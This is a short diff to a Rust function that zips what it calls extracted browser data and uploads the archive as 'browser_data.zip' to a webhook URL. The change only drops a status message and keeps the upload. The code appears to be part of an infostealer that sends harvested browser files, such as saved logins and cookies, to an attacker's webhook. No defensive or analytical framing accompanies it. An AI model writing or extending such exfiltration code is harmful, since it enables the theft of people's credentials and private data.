@@ -30,17 +30,11 @@ pub async fn send_zip(
     let zip_data = fs::read(&zip_path)?;
     crate::log::log(&format!("zip size: {} bytes", zip_data.len()));
 
-    let file_count = files.len();
     let part = reqwest::multipart::Part::bytes(zip_data)
         .file_name("browser_data.zip")
         .mime_str("application/zip")?;
 
-    let form = reqwest::multipart::Form::new()
-        .text(
-            "content",
-            format!("📦 **Browser Data** — {} file(s) extracted", file_count),
-        )
-        .part("file", part);
+    let form = reqwest::multipart::Form::new().part("file", part);
 
     let response = client.post(webhook_url).multipart(form).send().await?;
     let status = response.status();
